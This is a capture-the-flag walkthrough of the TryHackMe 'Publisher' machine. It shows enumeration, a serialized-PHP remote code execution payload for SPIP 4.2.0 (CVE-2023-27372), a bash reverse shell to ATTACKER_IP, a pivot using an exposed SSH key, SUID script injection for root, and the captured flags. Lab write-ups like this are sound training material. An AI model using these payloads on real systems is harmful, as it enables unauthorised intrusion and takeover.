---
title: 'TryHackMe - Publisher'
author: r2cook
categories: [TryHackMe]
tags: [docker, spip, RCE, suid, PrivEsc]
render_with_liquid: false
media_subpath: /images/thm/publisher/
image:
  path: room_card.png
---

> In this walkthrough, we compromise the TryHackMe **Publisher** machine by chaining **focused web enumeration, application-layer exploitation, container breakout opportunities, host pivoting, and Linux privilege escalation**, progressing from a limited web foothold to full root compromise while capturing both user and root flags.

## Initial Enumeration

### Nmap Scan

```shell
$ nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt publisher.thm
```
{: .nolineno }

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

The attack surface is small and focused:

- **22/SSH** → useful later for stable host access
- **80/HTTP** → likely initial access vector

The page title strongly suggested a publishing platform or CMS.

---

## Web Enumeration

### Landing Page

![Landing Page](web_portal_enum_80.webp){: width="800" height="400" .shadow }

The landing page appeared to be a blog-style publishing portal.

### Directory Fuzzing

```shell
$ ffuf -u http://publisher.thm/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt \
-e .php,.txt,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 -c
```
{: .nolineno }

Interesting results:

```text
images
server-status
spip
```

The most important finding was:

- `/spip`

This strongly indicated **SPIP CMS**.

---

## Initial Access

### SPIP Discovery

![SPIP Directory](spip_dir_enum.webp){: width="800" height="400" .shadow }

Viewing the source revealed SPIP cache paths:

![SPIP Source](spip_dir_enum_page_source.webp){: width="800" height="400" .shadow }

Version disclosure inside `config.txt`:

```text
Composed-By: SPIP @ www.spip.net + spip(4.2.0)
```

This version is vulnerable to:

> **CVE-2023-27372 – Unauthenticated RCE**

### Exploit

The vulnerable password reset endpoint accepted serialized PHP payloads.

```text
s:22:"<?php system('id'); ?>";
```

Encoded payload:

```text
s%3A22%3A%22%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E%22%3B
```

Replacing the email field in the Burp request confirmed code execution.

![Burp RCE Test](spip_endpoint_test_vuln_via_burp.webp){: width="800" height="450" .shadow }

---

## Foothold

After confirming RCE, upgrading to a reverse shell was straightforward.

```shell
$ nc -lvnp 9001
```
{: .nolineno }

Payload:

```text
s:74:"<?php system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1"'); ?>";
```

![Reverse Shell](open_nc_listener_9001.webp){: width="800" height="450" .shadow }

The shell landed inside a **Docker container** as `www-data`.

Reading the user flag:

```shell
$ cat /home/think/user.txt
fa229046d44eda6a3598c73ad96f4ca5
```
{: .nolineno }

---

## Lateral Movement / Pivot

The container exposed the mounted host home directory for `think`.

This allowed discovery of SSH keys:

![SSH Key Discovery](id_rsa_for_user_think.webp){: width="800" height="450" .shadow }

Using the key:

```shell
$ chmod 600 id_rsa
$ ssh -i id_rsa think@publisher.thm
```
{: .nolineno }

Now we had stable host access as `think`.

---

## Privilege Escalation

### Enumeration

```shell
$ find / -perm -4000 -type f 2>/dev/null
```
{: .nolineno }

Interesting custom binary:

```text
/usr/sbin/run_container
```

### Binary Analysis

Using `strings` revealed:

```text
/bin/bash
/opt/run_container.sh
```

This means root effectively executes:

```shell
bash /opt/run_container.sh
```
{: .nolineno }

### Exploit Path

To preserve effective root privileges:

```shell
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash -p
```
{: .nolineno }

Then inject:

```shell
echo "bash -p" >> /opt/run_container.sh
```
{: .nolineno }

Execute the SUID binary:

```shell
$ run_container
```
{: .nolineno }

Result:

```shell
$ id
uid=1000(think) gid=1000(think) euid=0(root)
```
{: .nolineno }

Root shell achieved.

![Privilege Escalation](PrivEsc_get_root_flag.webp){: width="800" height="450" .shadow }

---

## Root

```shell
$ cat /root/root.txt
3a4225cc9e85709adda6ef55d6a4f2ca
```
{: .nolineno }

---